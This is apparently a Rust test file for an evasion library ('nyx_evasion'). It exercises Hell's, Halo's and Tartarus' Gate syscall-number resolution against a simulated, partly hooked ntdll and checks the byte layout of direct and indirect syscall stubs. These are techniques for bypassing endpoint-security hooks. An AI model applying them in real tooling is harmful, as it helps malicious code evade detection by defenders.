//! Fixture-based SSN-resolution tests: a simulated ntdll syscall table (some
//! stubs hooked) exercises Hell's / Halo's / Tartarus' Gate without Windows.

use nyx_evasion::syscalls::{self, SyscallSource};

const STRIDE: u32 = 0x20;

struct FakeNtdll {
    image: Vec<u8>,
    exports: Vec<(String, u32)>,
}

impl SyscallSource for FakeNtdll {
    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        let s = rva as usize;
        if s >= self.image.len() {
            return Vec::new();
        }
        let end = (s + len).min(self.image.len());
        self.image[s..end].to_vec()
    }
    fn exports(&self) -> &[(String, u32)] {
        &self.exports
    }
}

/// `count` clean syscall stubs at `base + ssn*STRIDE` (SSNs 0..count); the
/// stubs in `hooked` have their prologue replaced with a jmp trampoline.
fn build(base_rva: u32, count: u32, hooked: &[u32]) -> FakeNtdll {
    let mut image = vec![0u8; base_rva as usize + count as usize * STRIDE as usize + 32];
    let mut exports = Vec::new();
    for ssn in 0..count {
        let rva = base_rva + ssn * STRIDE;
        let off = rva as usize;
        if hooked.contains(&ssn) {
            image[off] = 0xE9; // hooked: jmp trampoline (not the clean prologue)
        } else {
            image[off..off + 4].copy_from_slice(&[0x4C, 0x8B, 0xD1, 0xB8]); // mov r10,rcx; mov eax,
            image[off + 4..off + 8].copy_from_slice(&ssn.to_le_bytes());
        }
        exports.push((format!("Nt{}", ssn), rva));
    }
    FakeNtdll { image, exports }
}

#[test]
fn hells_gate_reads_clean_stub() {
    let ntdll = build(0x1000, 4, &[]);
    assert_eq!(syscalls::hells_gate(&ntdll, 0x1000 + 2 * STRIDE), Some(2));
}

#[test]
fn hells_gate_fails_on_hooked_stub() {
    let ntdll = build(0x1000, 6, &[3]);
    let rva3 = 0x1000 + 3 * STRIDE;
    assert_eq!(
        syscalls::hells_gate(&ntdll, rva3),
        None,
        "Hell's Gate can't read a hooked stub"
    );
}

#[test]
fn halos_gate_recovers_hooked_ssn() {
    let ntdll = build(0x1000, 6, &[3]);
    let rva3 = 0x1000 + 3 * STRIDE;
    // neighbour below at SSN 2 (k=1) -> 2 + 1 = 3
    assert_eq!(syscalls::halos_gate(&ntdll, rva3), Some(3));
}

#[test]
fn tartarus_gate_recovers_hooked_ssn() {
    let ntdll = build(0x1000, 6, &[3]);
    let rva3 = 0x1000 + 3 * STRIDE;
    assert_eq!(syscalls::tartarus_gate(&ntdll, rva3), Some(3));
}

#[test]
fn halos_gate_walks_past_consecutive_hooks() {
    // SSNs 3,4,5 hooked -> Halo walks from 3 down to the clean 2 (k=1).
    let ntdll = build(0x1000, 8, &[3, 4, 5]);
    let rva3 = 0x1000 + 3 * STRIDE;
    assert_eq!(syscalls::halos_gate(&ntdll, rva3), Some(3));
}

#[test]
fn tartarus_gate_walks_past_consecutive_hooks() {
    let ntdll = build(0x1000, 8, &[3, 4, 5]);
    let rva3 = 0x1000 + 3 * STRIDE;
    // anchors: below SSN 2 @ rva2, above SSN 6 @ rva6 -> stride 0x20 -> 2+1=3
    assert_eq!(syscalls::tartarus_gate(&ntdll, rva3), Some(3));
}

#[test]
fn resolve_table_fills_every_entry() {
    let ntdll = build(0x1000, 6, &[3]);
    let table = syscalls::resolve_table(&ntdll);
    let map: std::collections::HashMap<String, u32> = table.into_iter().collect();
    for ssn in 0..6u32 {
        assert_eq!(
            map[&format!("Nt{}", ssn)],
            ssn,
            "every SSN must resolve (3 via fallback)"
        );
    }
}

#[test]
fn all_hooked_is_unresolvable() {
    // No clean neighbour anywhere -> every entry is u32::MAX.
    let ntdll = build(0x1000, 3, &[0, 1, 2]);
    let table = syscalls::resolve_table(&ntdll);
    assert!(
        table.iter().all(|(_, ssn)| *ssn == u32::MAX),
        "fully-hooked table is unresolvable"
    );
}

#[test]
fn parse_ssn_matches_real_ntdll_prologue() {
    // bytes from a real Windows ntdll Nt stub (mov r10,rcx; mov eax,0x26)
    let real = [
        0x4C, 0x8B, 0xD1, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3,
    ];
    assert_eq!(syscalls::parse_ssn(&real), Some(0x26));
    // hooked (jmp) prologue -> None
    assert_eq!(syscalls::parse_ssn(&[0xE9, 0x00, 0x00, 0x00, 0x00]), None);
}

#[test]
fn direct_stub_byte_layout() {
    use nyx_evasion::stub::{direct_stub, OP_MOV_EAX_IMM32, PROLOGUE_MOV_R10_RCX, RET, SYSCALL};
    let s = direct_stub(0x55);
    assert_eq!(&s[..3], &PROLOGUE_MOV_R10_RCX[..]);
    assert_eq!(s[3], OP_MOV_EAX_IMM32);
    assert_eq!(u32::from_le_bytes([s[4], s[5], s[6], s[7]]), 0x55);
    assert_eq!(&s[8..10], &SYSCALL);
    assert_eq!(s[10], RET);
}

#[test]
fn indirect_stub_jumps_into_ntdll() {
    use nyx_evasion::stub::indirect_stub;
    let addr: u64 = 0x00007FF_12345678;
    let s = indirect_stub(0x1A, addr);
    assert_eq!(&s[..4], &[0x4C, 0x8B, 0xD1, 0xB8]);
    assert_eq!(u32::from_le_bytes([s[4], s[5], s[6], s[7]]), 0x1A);
    assert_eq!(&s[8..10], &[0x49, 0xBB]);
    assert_eq!(u64::from_le_bytes(s[10..18].try_into().unwrap()), addr);
    assert_eq!(&s[18..21], &[0x41, 0xFF, 0xE3]);
}
